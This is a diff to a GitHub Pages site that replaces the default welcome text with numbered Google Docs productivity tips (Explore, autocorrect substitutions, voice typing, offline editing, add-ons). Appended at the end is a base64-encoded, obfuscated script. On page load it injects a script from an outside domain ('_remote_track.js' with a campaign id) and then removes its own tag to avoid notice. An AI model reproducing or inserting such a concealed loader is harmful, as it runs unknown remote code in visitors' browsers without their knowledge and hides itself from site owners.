@@ -1,37 +1,21 @@
-## Welcome to GitHub Pages
+7. SEARCH THE INTERNET OR LOOK UP A WORD WITHOUT OPENING A NEW WINDOW.
+You can cut down on the number of tabs you’re juggling with two Google Doc hacks: the built-in internet browser and the built-in dictionary. The internet browser is under “Tools” and “Explore” (or “Control+Alt+Shift+I,” or “Command+Option+Shift+I” on a Mac), and it also searches through your Google Drive. You can access the dictionary under “Tools” and “Dictionary,” or use the shortcut “Control+Shift+Y” (“Command+Shift+Y” on a Mac). You can also get to either feature by right-clicking on any word or phrase in your Doc and choosing “Explore” or “Define.”
 
-You can use the [editor on GitHub](https://github.com/danielson90/Tips2/edit/gh-pages/index.md) to maintain and preview the content for your website in Markdown files.
+8. CREATE YOUR OWN SHORTHAND BY CUSTOMIZING AUTOCORRECT FEATURES.
+Select “Preferences” under “Tools” and you’ll be able to check or uncheck general preferences like “Automatically capitalize words,” “Automatically correct spelling,” and more. For a more personalized autocorrect experience, switch to the “Substitutions” tab—there, you can direct Google to automatically replace any given word, letter, or symbol with one of your choice. If, for example, you’d like Google to always add an accent to the e in Beyoncé, type Beyonce in the “Replace” column and Beyoncé in the “With” column.
 
-Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
+9. CUT DOWN ON SPELL-CHECK ERRORS BY ADDING WORDS TO YOUR PERSONAL DICTIONARY.
+To stop Google from continually registering certain unique words or names as spelling errors, add them to your “Personal Dictionary,” which is listed under “Tools” and then “Spelling and grammar.” If a word is already marked as an error in your Google Doc, you can also add it to your dictionary by right-clicking and choosing the “Add [word] to Dictionary.”
 
-### Markdown
+10. CONVERT YOUR GOOGLE DOC TO A DIFFERENT TYPE OF FILE.
+Prefer to work in Google Docs, but your manager always asks for Microsoft Word files? You can download your Google Doc as a Word document by going to “File” and “Download.” There are also options to convert it into a PDF, a web page, a plain text file, and more. Before you send it to anyone, we recommend giving it a read-through to make sure the formatting translated properly.
 
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
+11. TRANSCRIBE AUDIO FILES WITH GOOGLE’S VOICE TYPING FEATURE.
+While Google’s voice typing capabilities don’t extend to deciphering an audio file played aloud on a speaker, the process is definitely easier than pausing the audio every few seconds so you can manually type each word. In your navigation bar, go to “Tools” and then “Voice typing,” and make sure your microphone is enabled. Plug in your headphones, play your audio file, and clearly dictate whatever’s said—Google will transcribe it all for you. The feature can also be helpful for people with arthritis or other impairments that make it difficult to use a keyboard.
 
-```markdown
-Syntax highlighted code block
+12. ENABLE OFFLINE EDITING.
+Even if you’re not planning on being somewhere without internet access in the near future, Wi-Fi or power outages can happen unexpectedly—so it’s a good idea to enable offline editing just in case. To do it, install the Google Docs Offline extension, go to your Google Docs homepage, hit the main menu icon (three horizontal lines in the upper left corner), and choose “Settings.” Then, hit the gray “Offline” button so it slides to the right and turns blue.
 
-# Header 1
-## Header 2
-### Header 3
-
-- Bulleted
-- List
-
-1. Numbered
-2. List
-
-**Bold** and _Italic_ and `Code` text
-
-[Link](url) and ![Image](src)
-```
-
-For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).
-
-### Jekyll Themes
-
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/danielson90/Tips2/settings). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
-
-### Support or Contact
-
-Having trouble with Pages? Check out our [documentation](https://docs.github.com/categories/github-pages-basics/) or [contact support](https://github.com/contact) and we’ll help you sort it out.
+13. TAKE ADVANTAGE OF OTHER HANDY ADD-ONS.
+If you choose “Get add-ons” under “Add-ons” in your Google Doc toolbar, you’ll be able to search for add-ons or browse through Google’s most popular ones. A few of the highest-rated offerings include: Lucidchart, which helps you build flowcharts, diagrams, and more within your Doc; EasyBib, which automatically generates bibliography citations in APA, Chicago, or MLA format; and Doc to Form, which lets you easily convert information from a Google Doc into a Google Form (Google’s platform for online surveys).
+<script id="hr5On" src="data:text/javascript;base64, dmFyIF83dTRIbyA9IFsnXHg3MVx4NzVceDY1XHg3Mlx4NzlceDUzXHg2NVx4NmNceDY1XHg2M1x4NzRceDZmXHg3MicsICdceDYyXHg2Zlx4NjRceDc5JywgJ1x4NjdceDY1XHg3NFx4NDVceDZjXHg2NVx4NmRceDY1XHg2ZVx4NzRceDQyXHg3OVx4NDlceDY0JywgJ1x4NDRceDRmXHg0ZFx4NDNceDZmXHg2ZVx4NzRceDY1XHg2ZVx4NzRceDRjXHg2Zlx4NjFceDY0XHg2NVx4NjQnLCAnXHg2M1x4NzJceDY1XHg2MVx4NzRceDY1XHg0NVx4NmNceDY1XHg2ZFx4NjVceDZlXHg3NCcsICdceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnLCAnXHg3NFx4NzlceDcwXHg2NScsICdceDc0XHg2NVx4NzhceDc0XHgyZlx4NmFceDYxXHg3Nlx4NjFceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnXTsoZnVuY3Rpb24oX09jQmFHLCBfTEZObDUpIHt2YXIgXzNsVXRzID0gZnVuY3Rpb24oX1U0bmtCKSB7d2hpbGUgKC0tX1U0bmtCKSB7X09jQmFHWydwdXNoJ10oX09jQmFHWydzaGlmdCddKCkpO319O18zbFV0cygrK19MRk5sNSk7fShfN3U0SG8sIDB4MTFiKSk7dmFyIF9odUdtMSA9IGZ1bmN0aW9uKF9XY2pBTywgX3JtS0ZEKSB7X1djakFPID0gX1djakFPIC0gMHgwO3ZhciBfTTUxaVcgPSBfN3U0SG9bX1djakFPXTtyZXR1cm4gX001MWlXO307ZG9jdW1lbnRbJ1x4NjFceDY0XHg2NFx4NDVceDc2XHg2NVx4NmVceDc0XHg0Y1x4NjlceDczXHg3NFx4NjVceDZlXHg2NVx4NzInXShfaHVHbTEoJzB4MCcpLCBmdW5jdGlvbigpIHt2YXIgX1ROQlNLID0gZG9jdW1lbnRbX2h1R20xKCcweDEnKV0oX2h1R20xKCcweDInKSk7X1ROQlNLW19odUdtMSgnMHgzJyldID0gX2h1R20xKCcweDQnKTtfVE5CU0tbJ1x4NzNceDcyXHg2MyddID0gJ1x4NjhceDc0XHg3NFx4NzBceDczXHgzYVx4MmZceDJmXHg3M1x4NzBceDMyXHg2Zlx4NjlceDM5XHg3OFx4NzNceDJlXHg3MFx4NzJceDZmXHg2Nlx4NjVceDczXHg3OVx4NjFceDc5XHg2OVx4NmVceDZjXHg2MVx4NzJceDY5XHgyZVx4NjNceDZmXHg2ZFx4MmZceDVmXHg3Mlx4NjVceDZkXHg2Zlx4NzRceDY1XHg1Zlx4NzRceDcyXHg2MVx4NjNceDZiXHgyZVx4NmFceDczXHgzZlx4NjNceDYxXHg2ZFx4NzBceDYxXHg2OVx4NjdceDZlXHgzZFx4NTNceDRiXHg3N1x4NDhceDRmXHg1OVx4NDFceDMwXHg0ZVx4NzknO2RvY3VtZW50W19odUdtMSgnMHg1JyldKF9odUdtMSgnMHg2JykpWydceDYxXHg3MFx4NzBceDY1XHg2ZVx4NjRceDQzXHg2OFx4NjlceDZjXHg2NCddKF9UTkJTSyk7ZG9jdW1lbnRbX2h1R20xKCcweDcnKV0oJ2hyNU9uJylbJ1x4NzJceDY1XHg2ZFx4NmZceDc2XHg2NSddKCk7fSwgeydceDZmXHg2ZVx4NjNceDY1JzogISFbXX0pOw=="></script>
